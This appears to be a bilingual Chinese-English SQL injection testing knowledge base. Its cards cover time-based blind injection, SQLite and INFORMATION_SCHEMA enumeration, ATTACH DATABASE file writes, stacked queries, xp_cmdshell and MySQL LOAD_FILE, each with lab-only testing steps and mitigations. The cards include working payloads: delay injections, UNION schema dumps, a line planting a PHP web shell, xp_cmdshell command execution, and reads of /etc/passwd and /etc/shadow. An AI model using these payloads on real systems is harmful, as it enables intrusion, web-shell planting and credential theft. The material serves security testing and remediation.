description.en: Uses SLEEP, WAITFOR DELAY, or pg_sleep according to MySQL, SQL Server, or PostgreSQL dialect to validate non-reflected injection statistically.

prerequisites.zh: 先识别唯一目标 DBMS，只使用对应的 SLEEP、WAITFOR DELAY 或 pg_sleep 方言，并验证驱动语句位置。
prerequisites.en: Identify the single target DBMS first, use only its SLEEP, WAITFOR DELAY, or pg_sleep dialect, and verify the driver's statement placement.

prerequisites.zh: 收集足够的正常时延分布和数据库会话日志，以随机顺序交错运行短延时恒真、恒假和无延时样本。
prerequisites.en: Collect a sufficient normal-latency distribution and database-session logs, then interleave short-delay true, false, and no-delay samples in randomized order.

title.zh: Time-Based Blind SQLi (通用)
title.en: Validation step 1 for Cross-DBMS Time-Based Blind SQL Injection

execution.command:
'||SELECT(1)AND(SELECT(1)FROM(SELECT(SLEEP(5)))a)||'
1;SELECT SLEEP(5)--
1' SELECT SLEEP(5)--
1" SELECT SLEEP(5)--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B, INFORMATION_SCHEMA.TABLES C)--
1;WAITFOR DELAY '0:0:5'--
1';WAITFOR DELAY '0:0:5'--
1";WAITFOR DELAY '0:0:5'--
pg_sleep(5)--
1;SELECT PG_SLEEP(5)--
1' AND PG_SLEEP(5)--
1 AND (SELECT 1 FROM PG_SLEEP(5))--

description.zh: Time-Based Blind SQLi (通用)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Cross-DBMS Time-Based Blind SQL Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求恒真样本的延迟分布相对恒假与无延时样本显著分离，并且每次慢响应都能关联到后端延时函数执行。单次超时、跨方言语法错误、网络峰值、WAF 挑战、锁等待、冷缓存或连接池饱和都是假阳性边界。
analysis.en: Positive evidence requires the true samples' latency distribution to separate significantly from false and no-delay controls, with every slow response correlated to backend delay-function execution. One timeout, cross-dialect syntax errors, network spikes, WAF challenges, lock waits, cold caches, or connection-pool saturation are false-positive boundaries.

opsecTips.zh: 达到事先定义的样本数和置信阈值后停止，不把延时从短值提升到语料中的最大值。
opsecTips.en: Stop when the predefined sample count and confidence threshold are reached; do not raise the delay from the short test value to the corpus maximum.

opsecTips.zh: 取消标记会话，排空连接池，恢复数据库语句超时，并删除采样结果中的请求标识与临时指标。
opsecTips.en: Cancel tagged sessions, drain the connection pool, restore database statement timeouts, and delete request identifiers and temporary metrics from the sample set.

title.zh: 确认跨数据库时间盲注前置条件
title.en: Confirm Cross-DBMS Time-Based Blind Injection prerequisites

description.zh: 通用卡统一的是证据方法而不是混用方言；先识别数据库，再只选择对应延时函数并交错采样。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: The shared element is the evidence method, not mixed dialects; identify the database, choose its delay function, and interleave samples. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控跨数据库时间盲注探针
title.en: Run a controlled Cross-DBMS Time-Based Blind Injection probe

description.zh: 随机交错正常、恒真短延时和恒假短延时，多次采样并计算中位数与高分位，同时记录数据库执行时间。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Randomly interleave normal, true short-delay, and false short-delay requests, collect repeated samples, calculate medians and high percentiles, and record database time. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
'||SELECT(1)AND(SELECT(1)FROM(SELECT(SLEEP(5)))a)||'
1;SELECT SLEEP(5)--
1' SELECT SLEEP(5)--
1" SELECT SLEEP(5)--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B, INFORMATION_SCHEMA.TABLES C)--
1;WAITFOR DELAY '0:0:5'--
1';WAITFOR DELAY '0:0:5'--
1";WAITFOR DELAY '0:0:5'--
pg_sleep(5)--
1;SELECT PG_SLEEP(5)--
1' AND PG_SLEEP(5)--
1 AND (SELECT 1 FROM PG_SLEEP(5))--

title.zh: 核对跨数据库时间盲注成功证据
title.en: Verify Cross-DBMS Time-Based Blind Injection evidence

description.zh: 数据库日志必须只在恒真分支执行延时函数；网络抖动、锁等待、缓存和应用超时均需被排除。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Database logs must show delay execution only for the true branch; exclude network jitter, lock waits, caching, and application timeouts. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归跨数据库时间盲注
title.en: Remediate and regress Cross-DBMS Time-Based Blind Injection

description.zh: 参数化查询、严格类型绑定，设置语句超时、资源组和连接池上限，监控延时函数及条件化长查询。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Parameterize queries, enforce strict types, configure statement timeouts, resource groups, and pool limits, and monitor delay functions and conditional long queries. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

overview.zh: 跨数据库时间盲注探测聚焦通用卡统一的是证据方法而不是混用方言；先识别数据库，再只选择对应延时函数并交错采样。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: Cross-DBMS Time-Based Blind SQL Injection focuses on this boundary: The shared element is the evidence method, not mixed dialects; identify the database, choose its delay function, and interleave samples. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 拼接查询可在条件为真时调用延时或高成本函数，即使无回显也通过时间泄露布尔结果，并可能占用连接资源。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Concatenated queries can call a delay or expensive function on a true condition, leaking a Boolean result without reflection and consuming connection resources. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 随机交错正常、恒真短延时和恒假短延时，多次采样并计算中位数与高分位，同时记录数据库执行时间。 数据库日志必须只在恒真分支执行延时函数；网络抖动、锁等待、缓存和应用超时均需被排除。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Randomly interleave normal, true short-delay, and false short-delay requests, collect repeated samples, calculate medians and high percentiles, and record database time. Database logs must show delay execution only for the true branch; exclude network jitter, lock waits, caching, and application timeouts. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 参数化查询、严格类型绑定，设置语句超时、资源组和连接池上限，监控延时函数及条件化长查询。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Parameterize queries, enforce strict types, configure statement timeouts, resource groups, and pool limits, and monitor delay functions and conditional long queries. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

name.zh: SQLite 版本、Schema 与列枚举
name.en: SQLite Version, Schema, and Column Enumeration

description.zh: 使用 sqlite_version、sqlite_master、group_concat 与 pragma_table_info 验证 SQLite UNION 注入和测试 schema 元数据可见性。
description.en: Uses sqlite_version, sqlite_master, group_concat, and pragma_table_info to test SQLite UNION injection and visibility of test-schema metadata.

prerequisites.zh: 目标已确认使用 SQLite 且测试查询列数兼容 UNION
prerequisites.en: The target is confirmed to use SQLite and the test query has UNION-compatible columns.

prerequisites.zh: 使用只含伪数据和专用 users 表的数据库副本
prerequisites.en: A database copy contains only synthetic data and a dedicated users table.

title.zh: SQLite 元数据查询

execution.command:
1 UNION SELECT sqlite_version()--
1 UNION SELECT sql FROM sqlite_master--
1 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'--
1 UNION SELECT group_concat(name) FROM pragma_table_info('users')--

description.zh: 逐条对测试数据库使用，并把 users 替换为专用伪数据表；限制返回长度，不枚举真实生产 schema。
description.en: Use each line separately against the test database, replace users with a dedicated synthetic table, and cap output length rather than enumerating production schema.

analysis.zh: 版本、schema、表名和列名是不同深度的证据。只在专用测试库验证到固定元数据即可停止，不需要导出表内容。
analysis.en: Version, schema, relation, and column names represent increasing evidence depth. Stop after fixed metadata is proven in a dedicated test database; table contents are unnecessary.

opsecTips.zh: 将 users 替换为伪数据表并限制 group_concat 输出，避免收集生产 schema。
opsecTips.en: Replace users with a synthetic table and cap group_concat output to avoid collecting production schema.

opsecTips.zh: 使用数据库副本并保留只读快照，测试结束后销毁。
opsecTips.en: Use a database copy with a read-only snapshot and destroy it after testing.

title.zh: 确认 SQLite 与 UNION 列型
title.en: Confirm SQLite and UNION column types

description.zh: 用资产信息和常量 UNION 建立数据库方言、列数及回显位置。
description.en: Use asset information and constant UNION values to establish dialect, column count, and reflected position.

title.zh: 查询测试 schema 元数据

description.zh: 逐条运行版本、sqlite_master 和 PRAGMA 样例，只指向专用测试表。
description.en: Run version, sqlite_master, and PRAGMA samples separately and target only the dedicated test table.

attackChain.payload:
1 UNION SELECT sqlite_version()--
1 UNION SELECT sql FROM sqlite_master--
1 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'--
1 UNION SELECT group_concat(name) FROM pragma_table_info('users')--

title.zh: 关联结果与数据库审计

description.zh: 确认固定测试表名和列名进入结果，并排除静态文档、错误页与缓存。
description.en: Confirm fixed test relation and column names in output while excluding documentation, error pages, and caches.

title.zh: 参数化并限制文件权限

description.zh: 修复查询后重放所有样例，确认合法检索保留且 schema 语句只作为数据处理。
description.en: After query remediation replay all samples to preserve valid retrieval while schema syntax is treated only as data.

overview.zh: 这些样例专用于 SQLite，不是 DB2、Cassandra 或 BigQuery 通用语法。它们从版本确认逐步进入 schema 和列元数据，只有测试数据库中的固定标记被 UNION 合并到响应时才能确认注入。
overview.en: These samples are SQ Lite-specific, not generic DB2, Cassandra, or Big Query syntax. They move from version identification to schema and column metadata, and require a fixed marker from the test database to appear through UNION for confirmation.

vulnerability.zh: 根因是用户输入被拼接进 SQLite 查询结构，允许 UNION 注入执行 sqlite_master 或 PRAGMA 表值函数。即使业务表权限有限，SQLite 文件连接通常仍能读取该数据库内的完整 schema。
vulnerability.en: The cause is user input concatenated into SQLite query structure, permitting UNION access to sqlite_master or PRAGMA table-valued functions. Even limited business queries often share full schema visibility within the connected SQLite file.

exploitation.zh: 先用常量 UNION 确认列数和类型，再依次查询版本、专用测试表定义和列名，并关联最终 SQL 与固定伪数据。错误差异或页面中出现 SQLite 字样不足；元数据结果和数据库审计必须一致。
exploitation.en: Use constant UNION values to establish column count and type, then query version and a dedicated test table definition and columns. Correlate final SQL with fixed synthetic data. Error differences or a SQLite string in a page are insufficient; metadata output and audit must agree.

mitigation.zh: 所有查询值使用参数绑定，动态列/表名映射到服务端枚举；应用不得暴露任意 SQL 片段。SQLite 文件和备份使用最小文件权限，错误不返回 schema，回归覆盖 UNION 与 PRAGMA 输入。
mitigation.en: 所有查询值使用参数绑定，动态列/表名映射到服务端枚举；应用不得暴露任意 SQL 片段。SQLite 文件和备份使用最小文件权限，错误不返回 schema，回归覆盖 UNION 与 PRAGMA 输入。

name.zh: SQLite ATTACH DATABASE 文件写入

description.zh: 使用 ATTACH、CREATE TABLE 与 INSERT 组合验证堆叠 SQLite 注入是否能在数据库进程可写目录创建测试数据库文件。
description.en: Uses ATTACH, CREATE TABLE, and INSERT to test whether stacked SQLite injection can create a test database file in a process-writable directory.

subCategory.zh: SQLite 附加数据库文件写入

prerequisites.zh: 仅在一次性 SQLite 容器中验证堆叠语句和文件写入
prerequisites.en: Stacked statements and file writes are tested only in a disposable SQLite container.

prerequisites.zh: 测试目录在 Web 根外、为空且可完整回滚
prerequisites.en: The test directory is empty, outside the web root, and fully reversible.

title.zh: ATTACH 数据库写入样例

execution.command: ATTACH DATABASE '/var/www/html/shell.php' AS lol;CREATE TABLE lol.pwn(dataz text);INSERT INTO lol.pwn(dataz) VALUES('<?php system(["cmd"]);?>');--

description.zh: 原始行保留用于数据集审校；真实验证必须把 Web 路径改为一次性非执行目录，把脚本内容改为固定文本标记，并只执行一次。
description.en: The original line is retained for dataset review. Real validation must use a disposable nonexecutable directory, replace script content with a fixed text marker, and run only once.

analysis.zh: 分别报告堆叠 SQL、ATTACH 权限、文件创建与 Web 执行映射。只确认数据库文件创建时，结论应停留在文件写入而非 WebShell/RCE。
analysis.en: Report stacked SQL, ATTACH privilege, file creation, and web execution mapping separately. If only database-file creation is proven, stop at file write rather than webshell or RCE.

opsecTips.zh: 只写一次性目录中的固定文本数据库，禁止使用 Web 根和脚本内容。
opsecTips.en: Write only a fixed-text database in a disposable directory; never use a web root or script content.

opsecTips.zh: 测试前后校验目录清单和哈希，完成后删除整个容器。
opsecTips.en: Inventory and hash the directory before and after testing and destroy the entire container afterward.

title.zh: 准备隔离不可执行目录

description.zh: 在一次性容器创建空目录、随机路径和固定文本标记。
description.en: Create an empty directory, random path, and fixed text marker in a disposable container.

title.zh: 改写并提交 ATTACH 样例
title.en: Rewrite and submit the ATTACH sample

description.zh: 替换 Web 路径与 PHP 内容后只执行一次，保留最终 SQL。
description.en: Replace the web path and PHP content, execute once, and retain final SQL.

attackChain.payload: ATTACH DATABASE '/var/www/html/shell.php' AS lol;CREATE TABLE lol.pwn(dataz text);INSERT INTO lol.pwn(dataz) VALUES('<?php system(["cmd"]);?>');--

title.zh: 确认 SQLite 进程文件写入

description.zh: 匹配数据库审计、文件所有者、文件头和固定记录，排除预置文件。
description.en: Match database audit, file owner, file header, and fixed record, excluding preexisting files.

title.zh: 清理文件并撤销能力
title.en: Clean the file and revoke capability

description.zh: 删除测试库、收紧目录权限并修复查询后重放，确认 ATTACH 无法写入。
description.en: Delete the test database, tighten directory permissions, fix the query, and replay to confirm ATTACH cannot write.

overview.zh: ATTACH DATABASE 可在 SQLite 进程有权限的位置创建新数据库文件。该能力是注入与文件权限组合后的影响证明，不等于写入有效 PHP 文件；SQLite 文件头、目录映射和 Web 处理器都会影响后续结果。
overview.en: ATTACH DATABASE can create a database file where the SQLite process has permission. This is an impact proof combining injection and filesystem privilege, not automatic creation of a valid PHP file; SQLite headers, directory mapping, and web handlers affect any later outcome.

vulnerability.zh: 链条需要注入点允许堆叠语句、数据库连接允许 ATTACH、进程拥有目标目录写权限，并且用户可控制新库路径和内容。若目标目录由 Web 服务器解释，风险可能升级，但必须独立验证。
vulnerability.en: The chain requires stacked statements, ATTACH support, process write privilege, and control of the new database path and records. Risk may escalate if a web server interprets the target directory, but that boundary must be verified separately.

exploitation.zh: 在一次性容器创建空的不可执行目录，把路径和插入内容改为随机文件名与固定文本，提交一次后关联 SQL 审计、文件所有者、SQLite 文件头和标记记录。不得写脚本、覆盖文件或访问 Web 路由。
exploitation.en: In a disposable container create an empty nonexecutable directory, use a random filename and fixed text, submit once, and correlate SQL audit, owner, SQLite header, and marker record. Never write script content, overwrite files, or expose a web route.

mitigation.zh: 修复注入并禁用不需要的多语句，数据库文件目录和应用运行身份采用最小权限，Web 根目录不可由数据库进程写入。限制 ATTACH 能力、使用只读文件系统，并监控 ATTACH/CREATE TABLE 异常组合。
mitigation.en: Fix injection and disable unnecessary multi-statements, apply least privilege to database directories and the application identity, and prevent database writes to web roots. Restrict ATTACH, use a read-only filesystem, and monitor anomalous ATTACH and CREATE TABLE combinations.

name.zh: INFORMATION_SCHEMA 表与列枚举

description.zh: 使用 INFORMATION_SCHEMA.TABLES/COLUMNS 验证 UNION 注入是否能枚举测试数据库的关系和列元数据。
description.en: Uses INFORMATION_SCHEMA.TABLES and COLUMNS to test whether UNION injection can enumerate relation and column metadata in a test database.

prerequisites.zh: 目标数据库支持 INFORMATION_SCHEMA 且查询列型兼容
prerequisites.en: The target database supports INFORMATION_SCHEMA and compatible query columns.

prerequisites.zh: 专用 schema 只含少量伪表与列
prerequisites.en: A dedicated schema contains only a small set of synthetic relations and columns.

title.zh: 表与列目录查询

execution.command:
1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES--
1 UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'--

description.zh: 逐条用于专用 schema，并把 users 替换为伪表；添加数据库/Schema 过滤和结果上限。
description.en: Use each line separately in a dedicated schema, replace users with a synthetic relation, and add database or schema filters and a result limit.

analysis.zh: 以返回的专用测试元数据为充分证据并停止，不需要读取真实表数据。报告应注明数据库产品、目录范围和账户权限。
analysis.en: Treat returned dedicated test metadata as sufficient and stop without reading real records. State database product, catalog scope, and account privileges.

opsecTips.zh: 只查询专用 schema，并强制 LIMIT/过滤，禁止全库目录导出。
opsecTips.en: Query only the dedicated schema with mandatory filters and LIMIT; never export the full catalog.

opsecTips.zh: 表名与列名使用伪数据，不在报告中记录生产 schema。
opsecTips.en: Use synthetic relation and column names and omit production schema from reports.

title.zh: 确认目录方言与测试 schema
title.en: Confirm catalog dialect and test schema

description.zh: 建立专用 schema 和固定表/列名，并记录正常查询与权限。
description.en: Establish a dedicated schema with fixed relation and column names and record normal queries and privileges.

title.zh: 逐层查询测试元数据

description.zh: 先表后列逐条提交，添加 schema 过滤与结果上限。
description.en: Submit relation then column queries separately with schema filters and result limits.

attackChain.payload:
1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES--
1 UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'--

title.zh: 确认固定目录结果

description.zh: 将预置表/列名与最终 SQL 和数据库审计关联，排除静态提示。
description.en: Correlate preset relation and column names with final SQL and database audit, excluding static hints.

title.zh: 收紧查询与目录权限

description.zh: 修复后重放样例，确认合法业务查询保留且目录输入不再改变结构。
description.en: After remediation replay samples to preserve valid business queries while catalog input no longer alters structure.

overview.zh: INFORMATION_SCHEMA 是多个关系型数据库暴露元数据的标准接口，但具体字段、权限和大小写行为不同。测试只需证明专用测试表/列可被注入查询枚举，不应扫描整个生产目录。
overview.en: INFORMATION_SCHEMA is a standard metadata interface across several relational databases, though fields, privileges, and case rules differ. Testing only needs to prove that dedicated test relation and column names are enumerable, not scan the full production catalog.

vulnerability.zh: 根因是输入控制 UNION 查询结构，数据库账户又可读取目录视图。元数据可帮助推断业务 schema 和敏感列，即使当前查询本身不返回业务记录。
vulnerability.en: The cause is input controlling UNION structure while the database account can read catalog views. Metadata can reveal business schema and sensitive columns even when the original query returns no business records.

exploitation.zh: 先确认方言、列数和专用 schema，再分别查询测试表名和一个表的测试列名，并关联最终 SQL 与固定结果。加 schema 过滤和 LIMIT。错误或目录关键字回显不足，必须返回预置元数据。
exploitation.en: Confirm dialect, column count, and dedicated schema, then query a synthetic relation name and its fixed columns, correlating final SQL and output. Apply schema filtering and LIMIT. Errors or reflected catalog keywords are insufficient; preset metadata must be returned.

mitigation.zh: 参数化查询，动态标识符通过服务端映射，数据库账户只授予业务对象权限并在可行时限制目录可见性。错误不泄露 schema，异常 INFORMATION_SCHEMA 访问进入审计和告警。
mitigation.en: 参数化查询，动态标识符通过服务端映射，数据库账户只授予业务对象权限并在可行时限制目录可见性。错误不泄露 schema，异常 INFORMATION_SCHEMA 访问进入审计和告警。

name.zh: 堆叠语句与条件延迟探测
name.en: Stacked Statement and Conditional Delay Probes

description.zh: 使用分号堆叠和 IF 条件 SLEEP 变体验证驱动是否允许额外语句或可控查询延迟。
description.en: Uses semicolon stacking and conditional SLEEP variants to test whether the driver permits an extra statement or controllable query delay.

prerequisites.zh: 测试数据库和驱动行为可审计且请求无业务副作用
prerequisites.en: The test database and driver behavior are auditable and requests have no business side effects.

prerequisites.zh: 可采集交错真假控制的多轮时延样本
prerequisites.en: Repeated interleaved true and false timing controls can be collected.

title.zh: 堆叠与条件延迟样例

execution.command:
;SELECT SLEEP(5);--
';SELECT SLEEP(5);--
";SELECT SLEEP(5);--
' OR IF(1=1, SLEEP(5), 0)--

description.zh: 按输入引号上下文逐条选择，并在隔离环境把 5 秒降为可区分的最小延迟；同时运行无延迟与条件为假的对照。
description.en: Choose a line for the actual quote context, reduce five seconds to the smallest distinguishable delay in isolation, and run no-delay and false-condition controls.

analysis.zh: 报告应区分多语句能力与同语句时间盲注，并提供样本量、分位数和数据库审计。只证明其中一项时不要外推另一项。
analysis.en: Distinguish multi-statement capability from same-statement time injection and report sample size, percentiles, and database audit. Do not infer one from proof of the other.

opsecTips.zh: 缩短延迟并严格限制轮数，避免占用连接池。
opsecTips.en: Shorten delays and strictly cap rounds to avoid consuming the connection pool.

opsecTips.zh: 仅在无业务副作用测试查询中执行，不与写操作或真实用户请求并发。
opsecTips.en: 仅在无业务副作用测试查询中执行，不与写操作或真实用户请求并发。

title.zh: 建立无延迟统计基线

description.zh: 交错记录合法、条件为假和无延迟请求的应用与数据库耗时。
description.en: Interleave valid, false-condition, and no-delay requests and record application and database duration.

title.zh: 提交匹配上下文的延迟样例

description.zh: 一次选择一行并使用最小可辨延迟，多轮运行且保留最终 SQL。
description.en: Choose one line, use the minimum distinguishable delay, repeat multiple rounds, and retain final SQL.

attackChain.payload:
;SELECT SLEEP(5);--
';SELECT SLEEP(5);--
";SELECT SLEEP(5);--
' OR IF(1=1, SLEEP(5), 0)--

title.zh: 确认数据库延迟函数执行

description.zh: 匹配统计分布、查询审计和第二语句/IF 分支，排除网络和队列抖动。
description.en: Match timing distributions, query audit, and second-statement or IF execution, excluding network and queue jitter.

title.zh: 关闭堆叠并参数化回归

description.zh: 修复后按相同采样方案重放，确认延迟差异消失且业务查询正确。
description.en: After remediation replay the same sampling plan to confirm delay separation disappears while business queries remain correct.

overview.zh: 前三行测试语句终止后能否堆叠第二条 SELECT，第四行测试同一语句中的条件延迟。两者都需要统计和数据库审计，不能用单次慢响应推断。
overview.en: The first three lines test a second SELECT after statement termination; the fourth tests a conditional delay within one statement. Both require statistical and database-audit evidence rather than one slow response.

vulnerability.zh: 根因是输入被拼接进 SQL，且数据库驱动允许多语句或条件表达式。攻击者可通过时间函数建立盲信道，若堆叠成立还可能执行更高影响语句。
vulnerability.en: The cause is input concatenated into SQL while the driver permits multiple statements or conditional expressions. Timing functions create a blind channel, and successful stacking may allow higher-impact statements.

exploitation.zh: 先交错测量无延迟、条件为假和合法请求，选择匹配引号的一行并运行多轮。关联最终 SQL、数据库持续时间和应用响应。只有可重复分布差异且审计显示 SLEEP/第二语句执行才成立。
exploitation.en: Interleave no-delay, false-condition, and valid baselines, select one quote-matching line, and run multiple rounds. Correlate final SQL, database duration, and response. Confirm only repeatable separation with audited SLEEP or second-statement execution.

mitigation.zh: 使用参数化语句并关闭驱动多语句支持，动态条件映射为固定查询模板；配置语句超时和最小数据库权限，监控 SLEEP 等异常函数并回归成对时间用例。
mitigation.en: Use parameterized statements, disable driver multi-statements, map dynamic conditions to fixed query templates, set statement timeouts and least privilege, monitor abnormal delay functions, and regress paired timing cases.

name.zh: SQL Server xp_cmdshell 影响验证

description.zh: 使用 xp_cmdshell 命令与文件读取样例验证堆叠 SQL 注入是否跨越到 SQL Server 主机进程执行。
description.en: Uses xp_cmdshell command and file-read samples to test whether stacked SQL injection crosses into SQL Server host-process execution.

prerequisites.zh: 仅在一次性 SQL Server 实验实例验证并已确认 SQL 注入
prerequisites.en: Testing occurs only on a disposable SQL Server lab after SQL injection is confirmed.

prerequisites.zh: 使用固定标记命令和无敏感文件，且可审计子进程
prerequisites.en: Fixed marker commands and nonsensitive files are used with child-process auditing.

title.zh: xp_cmdshell 原始样例

description.zh: 原行用于说明影响。真实验证将 whoami/type 替换为只输出随机固定标记和读取专用标记文件的命令，并只执行一次。
description.en: The original lines document impact. Real validation replaces whoami and type with one fixed random-marker output and a dedicated marker-file read and executes once.

analysis.zh: 应分别证明注入、过程调用权限、启用状态和操作系统子进程。xp_cmdshell 被禁用的错误只说明产品特征，不是可利用 RCE。
analysis.en: Prove injection, procedure privilege, enabled state, and OS child process separately. A disabled xp_cmdshell error is a product signal, not exploitable RCE.

opsecTips.zh: 只在一次性实例运行固定标记，不读取 hosts 或执行 whoami 原命令。
opsecTips.en: Use a fixed marker only in a disposable instance; do not run the original whoami or hosts read.

opsecTips.zh: 不启用 xp_cmdshell 作为测试步骤；若默认禁用，记录并停止。
opsecTips.en: Do not enable xp_cmdshell for testing; if it is disabled by default, record that and stop.

title.zh: 审计扩展过程配置与权限

description.zh: 只读检查 xp_cmdshell 是否启用、调用主体和 SQL Server 服务身份。
description.en: Read-only inspect whether xp_cmdshell is enabled, the calling principal, and SQL Server service identity.

title.zh: 执行单次固定标记命令

description.zh: 在一次性实例将原命令改为固定标记输出，并保留数据库与进程审计。
description.en: In a disposable instance replace the original command with fixed marker output and retain database and process audit.

attackChain.payload:
EXEC xp_cmdshell 'whoami';--
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';--

title.zh: 确认 SQL Server 子进程
title.en: Confirm the SQL Server child process

description.zh: 匹配请求、SQL 审计、服务身份、子进程和固定输出，排除静态错误。
description.en: Match request, SQL audit, service identity, child process, and fixed output, excluding static errors.

title.zh: 撤销权限并回归

description.zh: 修复注入、撤销扩展过程权限并确认禁用后重放，确保无子进程。
description.en: Fix injection, revoke procedure privilege, verify disablement, and replay to ensure no child process.

overview.zh: xp_cmdshell 是 SQL Server 的高权限扩展过程。其存在、被禁用错误或函数名回显不等于 RCE；必须在隔离实例确认数据库会话调用它并由 SQL Server 服务身份启动受控子进程。
overview.en: xp_cmdshell is a high-impact SQL Server extended procedure. Presence, a disabled error, or reflected function name is not RCE; an isolated instance must show the database session invoking it and a controlled child process under the SQL Server service identity.

vulnerability.zh: 链条需要 SQL 注入控制语句、调用账户具备 EXEC 权限、xp_cmdshell 已启用或可被启用，并且服务身份拥有系统能力。每项都是独立边界，服务账户权限决定影响。
vulnerability.en: 链条需要 SQL 注入控制语句、调用账户具备 EXEC 权限、xp_cmdshell 已启用或可被启用，并且服务身份拥有系统能力。每项都是独立边界，服务账户权限决定影响。

exploitation.zh: 在一次性实例先审计 xp_cmdshell 配置，不做更改。若已授权且启用，将命令替换为固定标记输出并执行一次，匹配数据库审计、进程树和输出。禁止读取系统文件、建立网络连接或修改配置。
exploitation.en: Audit xp_cmdshell configuration in a disposable instance without changing it. If explicitly authorized and enabled, replace the command with fixed marker output and execute once, correlating database audit, process tree, and output. Do not read system files, connect outward, or modify configuration.

mitigation.zh: 参数化查询，应用数据库账户不授予高权限角色或扩展过程执行，保持 xp_cmdshell 禁用并监控配置变更。SQL Server 使用专用低权限服务账户，限制子进程和出站网络。
mitigation.en: Parameterize queries, withhold high-privilege roles and extended-procedure execution from the application account, keep xp_cmdshell disabled, and monitor configuration changes. Run SQL Server under a dedicated low-privilege identity and restrict child processes and egress.

name.zh: MySQL LOAD_FILE 文件读取影响

description.zh: 使用 Linux 与 Windows 路径的 LOAD_FILE 查询验证 SQL 注入是否可借数据库账户读取主机文件。
description.en: Uses LOAD_FILE queries for Linux and Windows paths to test whether SQL injection can read host files through database privileges.

prerequisites.zh: 仅在隔离 MySQL 容器和已确认注入后评估文件权限
prerequisites.en: Filesystem privilege is assessed only in an isolated MySQL container after injection is confirmed.

prerequisites.zh: 测试目录提供无敏感标记并可审计数据库文件访问
prerequisites.en: A test directory provides a nonsensitive marker with database file-access auditing.

title.zh: LOAD_FILE 跨平台样例

description.zh: 按数据库主机平台选择一行，并把系统目标替换为容器中的专用标记文件；不读取真实账户或系统配置。
description.en: Choose one line for the database host platform and replace the system target with a dedicated marker in the container; do not read real account or system configuration.

analysis.zh: 明确数据库主机、应用主机和文件来源。最强证据是 mysqld 读取专用标记；错误、NULL 或应用层文件内容都需要进一步归因。
analysis.en: Identify database host, application host, and file source. Strong evidence is mysqld reading the dedicated marker; errors, NULL, or application-tier content require further attribution.

opsecTips.zh: 禁止读取 passwd、shadow 或 hosts；只使用固定标记文件。
opsecTips.en: Never read passwd, shadow, or hosts; use only a fixed marker file.

opsecTips.zh: 只执行一次并立即删除标记，保留哈希和审计事件即可。
opsecTips.en: Execute once, remove the marker immediately, and retain only its hash and audit event.

title.zh: 审计 MySQL 文件边界

description.zh: 只读检查账户 FILE 权限、secure_file_priv 和 mysqld 可读测试目录。
description.en: Read-only inspect FILE privilege, secure_file_priv, and a test directory readable by mysqld.

title.zh: 读取单一测试标记

description.zh: 按平台选择一行并替换为标记路径，只执行一次。
description.en: Choose one platform-matching line, replace it with the marker path, and execute once.

attackChain.payload:
SELECT LOAD_FILE('/etc/passwd');--
SELECT LOAD_FILE('/etc/shadow');--
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');--

title.zh: 确认 mysqld 文件访问

description.zh: 匹配查询审计、进程文件访问和固定标记，不从 NULL/错误推断。
description.en: Match query audit, process file access, and fixed marker without inferring from NULL or errors.

title.zh: 撤销 FILE 权限并回归

description.zh: 修复查询和文件权限后重放标记与合法业务查询，确认读取拒绝。
description.en: After query and privilege fixes replay the marker and valid business queries to confirm file read denial.

overview.zh: LOAD_FILE 由数据库主机而非应用主机读取路径，受 MySQL FILE 权限、secure_file_priv、文件权限和大小限制影响。NULL 结果可能是安全配置或路径不存在，不能从错误推断任意读取。
overview.en: LOAD_FILE reads from the database host, not necessarily the application host, and depends on MySQL FILE privilege, secure_file_priv, filesystem permissions, and size limits. NULL can mean secure configuration or a missing path and does not imply arbitrary read.

vulnerability.zh: 链条需要 SQL 注入控制查询、应用数据库账户拥有 FILE 权限、目标位于允许目录且 mysqld 身份可读。若数据库和应用分离，读取范围属于数据库节点。
vulnerability.en: The chain requires query-controlling injection, FILE privilege, a target in an allowed location, and readability by the mysqld identity. When tiers are separate, exposure belongs to the database node.

